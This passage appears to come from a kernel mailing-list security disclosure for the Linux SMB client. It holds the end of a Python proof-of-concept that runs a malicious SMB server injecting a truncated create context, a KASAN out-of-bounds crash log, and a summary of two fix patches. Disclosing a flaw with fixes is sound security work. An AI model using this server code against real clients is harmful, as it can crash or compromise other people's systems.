-EhGnX1pHdZilqfbgSR2+Rnm287aSzwyz6spHNo5knlNob1lIAxo4hixt3llAU5+O
-R4GrPGTkHuiVs8HKPP4qIeX2MSq8LqWC6cCED0jbGtrhjTrZWYmwRD838sXl1Zjj
-BgZm7Oc3QAOzAgVS5ygxPlBVTr8dACUjOwT+qTspf4JaIP1eEMHe+/aHKZ6vpmOT
-GEJ1tRtSfPmeEuZYSCTmppbUvuwZ9oLcjSjts4hqX8nNelgG+TEU6hd1klyOP15O
-Jxa4Wf3mpBcd0DDANvmJl8LcSFObAGo9q0YfSCbE89wPse4yrGMal57EVGydoRzc
-h4D/kXUlbTKU2YFuzTD1Bg+nMCPKPf2X87Xn9jP2XZ/hwrHp6TphjVqA3XOIU8o8
-4+XarSuTw88hJnq5cmcTgpDk9uwDr0cGn3nzyMZ93V3HbKgsyMlzhsxEifp/XG7X
-3zD7O6b7lqLG+5DKwl20ShqV
-=Ff70
------END PGP SIGNATURE-----
+        commands, packets, error = original(conn_id, smb_server, recv_packet)
+        print(f"CREATE name={name!r} err=0x{error:08x}", flush=True)
 
---=-7EqmRrjDvDHZjW/E3w9a--
+        if error == STATUS_SUCCESS and name == TARGET_NAME:
+            resp = commands[0]
+            resp["CreateContextsOffset"] = TARGET_OFFSET
+            resp["CreateContextsLength"] = len(CONTEXT)
+            resp["AlignPad"] = ALIGN_PAD
+            resp["Buffer"] = CONTEXT
+            print(
+                f"injected truncated QFid context; packet_len={64 + len(resp.getData())}",
+                flush=True,
+            )
+
+        return commands, packets, error
+
+    smbserver.SMB2Commands.smb2Create = staticmethod(malicious_smb2_create)
+
+    server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0", listenPort=PORT)
+    server.setSMB2Support(True)
+    server.addShare(SHARE_NAME, str(share_dir), readOnly="yes")
+    server.setLogFile("/dev/stdout")
+
+    print(f"Serving //10.0.2.2/{SHARE_NAME} on tcp/{PORT}", flush=True)
+    print("Trigger file: probe", flush=True)
+
+    signal.signal(signal.SIGTERM, lambda _sig, _frame: (_ for _ in ()).throw(SystemExit(0)))
+    try:
+        server.start()
+    except (KeyboardInterrupt, SystemExit):
+        pass
+
+
+if __name__ == "__main__":
+    main()
+------END poc.py--------
+
+The following crash excerpt is from the decoded output generated by
+scripts/decode_stacktrace.sh with the matching vmlinux and source tree.
+
+﻿----BEGIN crash log----
+[   12.012483] ==================================================================
+[   12.013639] BUG: KASAN: slab-out-of-bounds in smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
+[   12.014787] Read of size 8 at addr ffff88800d564c00 by task cat/234
+[   12.015758] 
+[   12.016034] CPU: 1 UID: 0 PID: 234 Comm: cat Not tainted 7.2.0-rc7-00001-g9ca668da8e4c #2 PREEMPT(lazy) 
+[   12.016038] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   12.016040] Call Trace:
+[   12.016043]  <TASK>
+[   12.016044]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
+[   12.016050]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
+[   12.016054]  ? __pfx__raw_spin_lock_irqsave (include/asm-generic/qrwlock.h:122 (discriminator 4))
+[   12.016058]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
+[   12.016060]  kasan_report (mm/kasan/report.c:595)
+[   12.016062]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
+[   12.016064]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
+[   12.016067]  SMB2_open (fs/smb/client/smb2pdu.c:3388)
+[   12.016069]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unicode.c:567)
+[   12.016072]  ? kfree (include/linux/kasan.h:235 mm/slub.c:2677 mm/slub.c:6377 mm/slub.c:6692)
+[   12.016076]  ? __pfx_SMB2_open (fs/smb/client/smb2pdu.c:3281)
+[   12.016078]  ? __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5334 mm/slub.c:5359)
+[   12.016081]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_unicode.c:628 (discriminator 1))
+[   12.016084]  ? cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:510)
+[   12.016087]  ? __pfx_cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:489)
+[   12.016091]  ? smb2_open_file (fs/smb/client/smb2file.c:203)
+[   12.016094]  smb2_open_file (fs/smb/client/smb2file.c:203)
+[   12.016097]  ? __pfx_smb2_open_file (fs/smb/client/smb2file.c:78)
+[   12.016099]  ? __pfx__raw_spin_lock (include/asm-generic/qrwlock.h:87)
+[   12.016102]  ? __asan_memcpy (mm/kasan/shadow.c:106 (discriminator 1))
+[   12.016106]  cifs_open (fs/smb/client/file.c:613 fs/smb/client/file.c:1154)
+[   12.016109]  ? kasan_save_stack (mm/kasan/common.c:57)
+[   12.016112]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
+[   12.016119]  ? kasan_save_track (mm/kasan/common.c:78)
+[   12.016122]  ? _raw_spin_lock_irqsave (include/linux/instrumented.h:55 include/linux/atomic/atomic-instrumented.h:1301 include/asm-generic/qspinlock.h:111 include/linux/spinlock.h:187 include/linux/spinlock_api_smp.h:133 kernel/locking/spinlock.c:166)
+[   12.016131]  ? __pfx_lockref_get (??:?)
+[   12.016137]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
+[   12.016142]  ? do_dentry_open (fs/open.c:947)
+[   12.016146]  do_dentry_open (fs/open.c:947)
+[   12.016152]  vfs_open (fs/open.c:1052)
+[   12.016157]  path_openat (fs/namei.c:4700 fs/namei.c:4863)
+[   12.016164]  ? __pfx_path_openat (fs/namei.c:4805)
+[   12.016169]  do_file_open (fs/namei.c:4892)
+[   12.016173]  ? __pfx_do_file_open (fs/namei.c:4618)
+[   12.016196]  ? alloc_fd (include/linux/spinlock.h:390 fs/file.c:610)
+[   12.016203]  ? do_getname (fs/namei.c:198)
+[   12.016207]  do_sys_openat2 (fs/open.c:1368 (discriminator 1))
+[   12.016213]  ? __pfx_do_sys_openat2 (fs/open.c:1257)
+[   12.016217]  ? __pfx___do_sys_newfstat (fs/stat.c:456)
+[   12.016224]  __x64_sys_openat (fs/open.c:1374 fs/open.c:1390 fs/open.c:1385 fs/open.c:1385)
+[   12.016229]  ? __pfx___x64_sys_openat (fs/open.c:1378)
+[   12.016235]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
+[   12.016241]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[   12.016247] RIP: 0033:0x7f4fe3e7f1c7
+[   12.016253] Code: 25 00 00 41 00 3d 00 00 41 00 74 47 64 8b 04 25 18 00 00 00 85 c0 75 6b 44 89 e2 48 89 ee bf 9c ff ff ff b8 01 01 00 00 0f 05 <48> 3d 00 f0 ff ff 0f 87 95 00 00 00 48 8b 4c 24 28 64 48 2b 0c 25
+All code
+========
+   0:	25 00 00 41 00       	and    $0x410000,%eax
+   5:	3d 00 00 41 00       	cmp    $0x410000,%eax
+   a:	74 47                	je     0x53
+   c:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
+  13:	00 
+  14:	85 c0                	test   %eax,%eax
+  16:	75 6b                	jne    0x83
+  18:	44 89 e2             	mov    %r12d,%edx
+  1b:	48 89 ee             	mov    %rbp,%rsi
+  1e:	bf 9c ff ff ff       	mov    $0xffffff9c,%edi
+  23:	b8 01 01 00 00       	mov    $0x101,%eax
+  28:	0f 05                	syscall
+  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
+  30:	0f 87 95 00 00 00    	ja     0xcb
+  36:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
+  3b:	64                   	fs
+  3c:	48                   	rex.W
+  3d:	2b                   	.byte 0x2b
+  3e:	0c 25                	or     $0x25,%al
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+   6:	0f 87 95 00 00 00    	ja     0xa1
+   c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
+  11:	64                   	fs
+  12:	48                   	rex.W
+  13:	2b                   	.byte 0x2b
+  14:	0c 25                	or     $0x25,%al
+[   12.016258] RSP: 002b:00007ffefc4f6030 EFLAGS: 00000246 ORIG_RAX: 0000000000000101
+[   12.016265] RAX: ffffffffffffffda RBX: 0000561e1464f634 RCX: 00007f4fe3e7f1c7
+[   12.016269] RDX: 0000000000000000 RSI: 00007ffefc4f6ede RDI: 00000000ffffff9c
+[   12.016272] RBP: 00007ffefc4f6ede R08: 0000000000000001 R09: 0000000000000000
+[   12.016275] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
+[   12.016278] R13: 00007ffefc4f6318 R14: 0000000000000000 R15: 0000000000020000
+[   12.016282]  </TASK>
+[   12.016285] 
+[   12.065221] Allocated by task 232:
+[   12.065778]  kasan_save_stack (mm/kasan/common.c:57)
+[   12.066421]  kasan_save_track (mm/kasan/common.c:78)
+[   12.067212]  __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common.c:366)
+[   12.067836]  kmem_cache_alloc_noprof (include/linux/kasan.h:253 mm/slub.c:4584 mm/slub.c:4917 mm/slub.c:4931)
+[   12.069428]  mempool_alloc_noprof (mm/mempool.c:559)
+[   12.070177]  cifs_small_buf_get (fs/smb/client/misc.c:237 (discriminator 2))
+[   12.070797]  allocate_buffers (fs/smb/client/connect.c:659)
+[   12.071430]  cifs_demultiplex_thread (fs/smb/client/connect.c:1281)
+[   12.072170]  kthread (kernel/kthread.c:436)
+[   12.072778]  ret_from_fork (arch/x86/kernel/process.c:158)
+[   12.073592]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
+[   12.074318] 
+[   12.074646] The buggy address belongs to the object at ffff88800d564a40
+[   12.074646]  which belongs to the cache cifs_small_rq of size 448
+[   12.076729] The buggy address is located 0 bytes to the right of
+[   12.076729]  allocated 448-byte region [ffff88800d564a40, ffff88800d564c00)
+[   12.079436] 
+[   12.079712] The buggy address belongs to the physical page:
+[   12.080845] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff88800d5651c0 pfn:0xd564
+[   12.082977] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
+[   12.084130] flags: 0x100000000000240(workingset|head|node=0|zone=1)
+[   12.085595] page_type: f5(slab)
+[   12.086420] raw: 0100000000000240 ffff8880026459c0 ffff888002ca6e50 ffff888002ca6e50
+[   12.087847] raw: ffff88800d5651c0 00000000000c0007 00000000f5000000 0000000000000000
+[   12.089515] head: 0100000000000240 ffff8880026459c0 ffff888002ca6e50 ffff888002ca6e50
+[   12.090958] head: ffff88800d5651c0 00000000000c0007 00000000f5000000 0000000000000000
+[   12.092304] head: 0100000000000001 ffffffffffffff81 00000000ffffffff 00000000ffffffff
+[   12.094665] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
+[   12.095841] page dumped because: kasan: bad access detected
+[   12.097003] 
+[   12.097835] Memory state around the buggy address:
+[   12.099253]  ffff88800d564b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[   12.100390]  ffff88800d564b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[   12.102134] >ffff88800d564c00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   12.103515]                    ^
+[   12.104394]  ffff88800d564c80: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00
+[   12.105856]  ffff88800d564d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[   12.107468] ==================================================================
+[   12.110319] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[   12.112041] CPU: 1 UID: 0 PID: 234 Comm: cat Not tainted 7.2.0-rc7-00001-g9ca668da8e4c #2 PREEMPT(lazy) 
+[   12.113570] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   12.116267] Call Trace:
+[   12.116691]  <TASK>
+[   12.117097]  vpanic (kernel/panic.c:651)
+[   12.117667]  ? __pfx_vpanic (kernel/panic.c:362)
+[   12.118611]  ? preempt_schedule_irq (kernel/sched/core.c:7556)
+[   12.120045]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
+[   12.120831]  panic (kernel/panic.c:788)
+[   12.121342]  ? __pfx_panic (kernel/panic.c:742)
+[   12.121990]  check_panic_on_warn (kernel/panic.c:525 kernel/panic.c:520)
+[   12.122652]  end_report (mm/kasan/report.c:227)
+[   12.123305]  kasan_report (mm/kasan/report.c:597)
+[   12.124037]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
+[   12.124851]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
+[   12.125619]  SMB2_open (fs/smb/client/smb2pdu.c:3388)
+[   12.126257]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unicode.c:567)
+[   12.127035]  ? kfree (include/linux/kasan.h:235 mm/slub.c:2677 mm/slub.c:6377 mm/slub.c:6692)
+[   12.127765]  ? __pfx_SMB2_open (fs/smb/client/smb2pdu.c:3281)
+[   12.128403]  ? __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5334 mm/slub.c:5359)
+[   12.129117]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_unicode.c:628 (discriminator 1))
+[   12.129863]  ? cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:510)
+[   12.130942]  ? __pfx_cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:489)
+[   12.134088]  ? smb2_open_file (fs/smb/client/smb2file.c:203)
+[   12.136608]  smb2_open_file (fs/smb/client/smb2file.c:203)
+[   12.137833]  ? __pfx_smb2_open_file (fs/smb/client/smb2file.c:78)
+[   12.138800]  ? __pfx__raw_spin_lock (include/asm-generic/qrwlock.h:87)
+[   12.140451]  ? __asan_memcpy (mm/kasan/shadow.c:106 (discriminator 1))
+[   12.141281]  cifs_open (fs/smb/client/file.c:613 fs/smb/client/file.c:1154)
+[   12.141882]  ? kasan_save_stack (mm/kasan/common.c:57)
+[   12.142556]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
+[   12.143287]  ? kasan_save_track (mm/kasan/common.c:78)
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (2):
+  smb: client: fix create context out-of-bounds reads
+  smb: client: validate POSIX create context length
+
+ fs/smb/client/smb2pdu.c | 43 ++++++++++++++++++++++++++++++++++-------
+ 1 file changed, 36 insertions(+), 7 deletions(-)
+
+-- 
+2.43.0
